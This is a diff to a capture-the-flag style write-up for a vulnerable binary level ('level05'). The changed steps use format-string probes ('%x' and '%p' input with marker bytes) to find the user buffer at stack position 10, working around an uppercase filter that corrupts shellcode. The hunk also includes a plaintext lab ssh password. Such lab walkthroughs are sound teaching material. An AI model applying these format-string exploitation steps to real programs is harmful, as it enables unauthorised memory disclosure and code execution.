@@ -31,33 +31,40 @@ Open the binary in Ghidra and examine the `main` function.
 - Traditional shellcode contains uppercase bytes that get corrupted
 - Example: `0x52` ('R') becomes `0x72` ('r')
 
-## 5. Test format string exploit
+## 5. Find buffer position on stack
+
+Use the marker technique to find where our buffer is positioned:
 
 ```bash
 ssh level05@localhost -p 2222
 # Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 
-./level05
-%p %p %p %p %p %p %p %p %p %p
-```
-
-**Output shows:**
-```
-0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffdc94 0xf7fdb000 0x25207025
-```
-
-The 10th pointer (`0x25207025` = `"% p"`) indicates our buffer is at **stack position 10**.
-
-## 6. Verify stack positions
-
-```bash
-./level05
-AAAABBBBCCCCDDDD%10$p%11$p%12$p%13$p
+echo 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
 ```
 
 **Output:**
 ```
-aaaabbbbccccdddd0x616161610x626262620x636363630x64646464
+aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.
+                                                     ^^^^^^^^
+                                                     Position 10!
+```
+
+**Analysis:**
+- `AAAA` (0x41414141) gets converted to `aaaa` (0x61616161) by the uppercase filter
+- The hex value `61616161` appears at the 10th `%x` output
+- Our buffer starts at **stack position 10**
+
+## 6. Verify multiple consecutive positions
+
+```bash
+echo 'AAAABBBBCCCCDDDD%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
+```
+
+**Output:**
+```
+aaaabbbbccccdddd64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.62626262.63636363.64646464.
+                                                                 ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
+                                                                 Pos 10   Pos 11   Pos 12   Pos 13
 ```
 
 Confirms:
